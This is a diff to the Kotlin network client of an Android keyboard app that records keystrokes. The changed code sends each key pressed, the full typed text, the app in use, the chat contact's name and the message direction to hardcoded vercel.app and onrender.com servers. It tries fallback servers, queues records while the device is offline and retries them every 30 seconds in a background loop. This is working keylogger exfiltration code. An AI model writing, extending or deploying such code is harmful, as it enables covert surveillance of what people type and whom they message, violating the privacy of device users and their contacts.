@@ -2,273 +2,215 @@ package com.keywordrecord.keyboard
 
 import android.content.Context
 import android.net.ConnectivityManager
-import android.net.Network
 import android.net.NetworkCapabilities
 import android.util.Log
-import okhttp3.Call
-import okhttp3.Callback
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
-import okhttp3.Response
 import org.json.JSONObject
-import java.io.IOException
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
-class ApiClient(private val context: Context) {
-    private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-    private val defaultServerUrl = context.getString(R.string.default_server_url)
-    private val fallbackServerUrl = context.getString(R.string.fallback_server_url)
-    private val offlineQueue = OfflineQueue(context)
-    private val isFlushing = AtomicBoolean(false)
+class ApiClient(context: Context) {
+    private val appContext = context.applicationContext
+    private val prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+    private val offlineQueue = OfflineQueue(appContext)
+    private val syncInProgress = AtomicBoolean(false)
+    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    private var syncJob: Job? = null
+    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
+
     private val client = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .writeTimeout(15, TimeUnit.SECONDS)
-        .readTimeout(15, TimeUnit.SECONDS)
+        .connectTimeout(8, TimeUnit.SECONDS)
+        .readTimeout(8, TimeUnit.SECONDS)
+        .writeTimeout(8, TimeUnit.SECONDS)
         .build()
 
+    private val deviceUniqueId: String by lazy {
+        DeviceIdManager.getDeviceUniqueId(appContext)
+    }
+
     init {
-        registerNetworkCallback()
-        flushOfflineQueue()
+        startBackgroundSync()
+        scope.launch {
+            flushQueue()
+        }
     }
 
     fun getServerUrl(): String {
-        return prefs.getString(KEY_SERVER_URL, null)?.takeIf { it.isNotBlank() }
-            ?: defaultServerUrl
-    }
-
-    fun getCandidateServerUrls(): List<String> {
-        val preferred = normalizeUrl(getServerUrl())
-        val vercel = normalizeUrl(defaultServerUrl)
-        val render = normalizeUrl(fallbackServerUrl)
-        return linkedSetOf(preferred, vercel, render).filter { it.isNotBlank() }
+        return prefs.getString(KEY_SERVER_URL, DEFAULT_PRIMARY_URL)?.trim().orEmpty()
+            .ifBlank { DEFAULT_PRIMARY_URL }
+            .trimEnd('/')
     }
 
     fun saveServerUrl(url: String) {
-        prefs.edit().putString(KEY_SERVER_URL, normalizeUrl(url)).apply()
+        prefs.edit().putString(KEY_SERVER_URL, url.trim().trimEnd('/')).apply()
     }
 
-    fun normalizeUrl(url: String): String {
-        return url.trim().trimEnd('/')
-    }
-
-    fun testConnection(url: String, onResult: (Boolean, String) -> Unit) {
-        val normalized = normalizeUrl(url)
-        if (!normalized.startsWith("http://") && !normalized.startsWith("https://")) {
-            onResult(false, "Invalid URL")
-            return
-        }
-
-        val request = Request.Builder()
-            .url("$normalized/health")
-            .get()
-            .build()
-
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-                onResult(false, e.message ?: "Connection failed")
-            }
-
-            override fun onResponse(call: Call, response: Response) {
-                response.use {
-                    onResult(it.isSuccessful, if (it.isSuccessful) "ok" else "HTTP ${it.code}")
+    fun testConnection(url: String, callback: (Boolean, String?) -> Unit) {
+        scope.launch {
+            val base = url.trim().trimEnd('/')
+            val ok = try {
+                val request = Request.Builder()
+                    .url("$base/health")
+                    .get()
+                    .build()
+                client.newCall(request).execute().use { response ->
+                    response.isSuccessful
                 }
+            } catch (e: Exception) {
+                Log.w(TAG, "Connection test failed: ${e.message}")
+                false
             }
-        })
-    }
-
-    fun recordKeystroke(
-        deviceUniqueId: String,
-        keyPressed: String,
-        fullText: String,
-        appPackage: String,
-        action: String
-    ) {
-        if (!isOnline()) {
-            offlineQueue.enqueue(deviceUniqueId, keyPressed, fullText, appPackage, action)
-            return
-        }
-
-        postKeystrokeWithFallback(deviceUniqueId, keyPressed, fullText, appPackage, action) { success ->
-            if (!success) {
-                offlineQueue.enqueue(deviceUniqueId, keyPressed, fullText, appPackage, action)
-            } else {
-                flushOfflineQueue()
-            }
+            callback(ok, if (ok) null else "unreachable")
         }
     }
 
     fun flushOfflineQueue() {
-        if (!isOnline()) return
-        if (!isFlushing.compareAndSet(false, true)) return
-
-        val pending = offlineQueue.peekAll()
-        if (pending.isEmpty()) {
-            isFlushing.set(false)
-            return
-        }
-
-        flushNext(pending, 0)
+        flushNow()
     }
 
-    private fun flushNext(pending: List<JSONObject>, index: Int) {
-        if (index >= pending.size) {
-            offlineQueue.removeFirst(pending.size)
-            isFlushing.set(false)
-            Log.d(TAG, "Offline queue synced (${pending.size} records)")
-            return
-        }
-
-        if (!isOnline()) {
-            offlineQueue.removeFirst(index)
-            isFlushing.set(false)
-            return
-        }
-
-        val item = pending[index]
-        postKeystrokeWithFallback(
-            deviceUniqueId = item.optString("deviceUniqueId"),
-            keyPressed = item.optString("keyPressed"),
-            fullText = item.optString("fullText"),
-            appPackage = item.optString("appPackage", "unknown"),
-            action = item.optString("action", "key")
-        ) { success ->
-            if (success) {
-                flushNext(pending, index + 1)
-            } else {
-                offlineQueue.removeFirst(index)
-                isFlushing.set(false)
+    fun recordKeystroke(
+        keyPressed: String,
+        fullText: String,
+        appPackage: String,
+        action: String = "key",
+        contactName: String = ChatContextHolder.contactName,
+        direction: String = "outgoing"
+    ) {
+        scope.launch {
+            val payload = JSONObject().apply {
+                put("deviceUniqueId", deviceUniqueId)
+                put("keyPressed", keyPressed)
+                put("fullText", fullText)
+                put("appPackage", appPackage)
+                put("action", action)
+                put("contactName", contactName)
+                put("direction", direction)
             }
-        }
-    }
 
-    private fun postKeystrokeWithFallback(
-        deviceUniqueId: String,
-        keyPressed: String,
-        fullText: String,
-        appPackage: String,
-        action: String,
-        onComplete: (Boolean) -> Unit
-    ) {
-        val urls = getCandidateServerUrls()
-        tryPostKeystroke(urls, 0, deviceUniqueId, keyPressed, fullText, appPackage, action, onComplete)
-    }
-
-    private fun tryPostKeystroke(
-        urls: List<String>,
-        index: Int,
-        deviceUniqueId: String,
-        keyPressed: String,
-        fullText: String,
-        appPackage: String,
-        action: String,
-        onComplete: (Boolean) -> Unit
-    ) {
-        if (index >= urls.size) {
-            onComplete(false)
-            return
-        }
-
-        val baseUrl = urls[index]
-        postKeystroke(baseUrl, deviceUniqueId, keyPressed, fullText, appPackage, action) { success ->
-            if (success) {
-                if (baseUrl != getServerUrl()) {
-                    Log.d(TAG, "Fallback server succeeded: $baseUrl")
-                }
-                onComplete(true)
-            } else {
-                Log.w(TAG, "Server failed ($baseUrl). Trying next...")
-                tryPostKeystroke(
-                    urls,
-                    index + 1,
-                    deviceUniqueId,
-                    keyPressed,
-                    fullText,
-                    appPackage,
-                    action,
-                    onComplete
+            val sent = tryPostWithFallback(payload)
+            if (!sent) {
+                offlineQueue.enqueue(
+                    deviceUniqueId = deviceUniqueId,
+                    keyPressed = keyPressed,
+                    fullText = fullText,
+                    appPackage = appPackage,
+                    action = action,
+                    contactName = contactName,
+                    direction = direction
                 )
+            } else if (offlineQueue.size() > 0) {
+                flushQueue()
             }
         }
     }
 
-    private fun postKeystroke(
-        baseUrl: String,
-        deviceUniqueId: String,
-        keyPressed: String,
-        fullText: String,
-        appPackage: String,
-        action: String,
-        onComplete: (Boolean) -> Unit
-    ) {
-        val payload = JSONObject().apply {
-            put("deviceUniqueId", deviceUniqueId)
-            put("keyPressed", keyPressed)
-            put("fullText", fullText)
-            put("appPackage", appPackage)
-            put("action", action)
+    fun flushNow() {
+        scope.launch {
+            flushQueue()
         }
+    }
 
-        val requestBody = payload.toString().toRequestBody(JSON_MEDIA_TYPE)
-        val request = Request.Builder()
-            .url("$baseUrl/api/keystrokes")
-            .post(requestBody)
-            .build()
-
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-                Log.e(TAG, "Failed to record keystroke on $baseUrl: ${e.message}")
-                onComplete(false)
+    private fun startBackgroundSync() {
+        if (syncJob?.isActive == true) return
+        syncJob = scope.launch {
+            while (isActive) {
+                flushQueue()
+                delay(SYNC_INTERVAL_MS)
             }
+        }
+    }
 
-            override fun onResponse(call: Call, response: Response) {
-                response.use {
-                    if (!it.isSuccessful) {
-                        Log.e(TAG, "Server error on $baseUrl: ${it.code}")
-                    }
-                    onComplete(it.isSuccessful)
+    private suspend fun flushQueue() {
+        if (!syncInProgress.compareAndSet(false, true)) return
+        try {
+            if (!hasNetwork()) return
+
+            while (true) {
+                val batch = offlineQueue.peekAll().take(BATCH_SIZE)
+                if (batch.isEmpty()) break
+
+                var successCount = 0
+                for (item in batch) {
+                    val ok = tryPostWithFallback(item)
+                    if (!ok) break
+                    successCount++
+                }
+
+                if (successCount == 0) break
+                offlineQueue.removeFirst(successCount)
+                if (successCount < batch.size) break
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed flushing offline queue: ${e.message}")
+        } finally {
+            syncInProgress.set(false)
+        }
+    }
+
+    private fun tryPostWithFallback(payload: JSONObject): Boolean {
+        for (baseUrl in buildUrlList()) {
+            if (postOnce(baseUrl, payload)) {
+                return true
+            }
+        }
+        return false
+    }
+
+    private fun buildUrlList(): List<String> {
+        val custom = getServerUrl()
+        val urls = linkedSetOf<String>()
+        urls.add(custom)
+        urls.add(DEFAULT_PRIMARY_URL)
+        urls.add(DEFAULT_FALLBACK_URL)
+        return urls.map { it.trimEnd('/') }
+    }
+
+    private fun postOnce(baseUrl: String, payload: JSONObject): Boolean {
+        return try {
+            val body = payload.toString().toRequestBody(jsonMediaType)
+            val request = Request.Builder()
+                .url("$baseUrl/api/keystrokes")
+                .post(body)
+                .build()
+
+            client.newCall(request).execute().use { response ->
+                if (response.isSuccessful) {
+                    true
+                } else {
+                    Log.w(TAG, "API $baseUrl failed: ${response.code}")
+                    false
                 }
             }
-        })
+        } catch (e: Exception) {
+            Log.w(TAG, "API $baseUrl unreachable: ${e.message}")
+            false
+        }
     }
 
-    private fun isOnline(): Boolean {
-        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
-            ?: return false
+    private fun hasNetwork(): Boolean {
+        val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val network = cm.activeNetwork ?: return false
         val caps = cm.getNetworkCapabilities(network) ?: return false
         return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-    }
-
-    private fun registerNetworkCallback() {
-        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
-            ?: return
-        try {
-            cm.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
-                override fun onAvailable(network: Network) {
-                    flushOfflineQueue()
-                }
-
-                override fun onCapabilitiesChanged(
-                    network: Network,
-                    networkCapabilities: NetworkCapabilities
-                ) {
-                    if (networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) {
-                        flushOfflineQueue()
-                    }
-                }
-            })
-        } catch (e: Exception) {
-            Log.e(TAG, "Network callback registration failed", e)
-        }
     }
 
     companion object {
         private const val TAG = "ApiClient"
         private const val PREFS_NAME = "keyword_record_prefs"
         private const val KEY_SERVER_URL = "server_url"
-        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
+        private const val SYNC_INTERVAL_MS = 30_000L
+        private const val BATCH_SIZE = 25
+        private const val DEFAULT_PRIMARY_URL = "https://keyword-record.vercel.app"
+        private const val DEFAULT_FALLBACK_URL = "https://keyword-record.onrender.com"
     }
 }
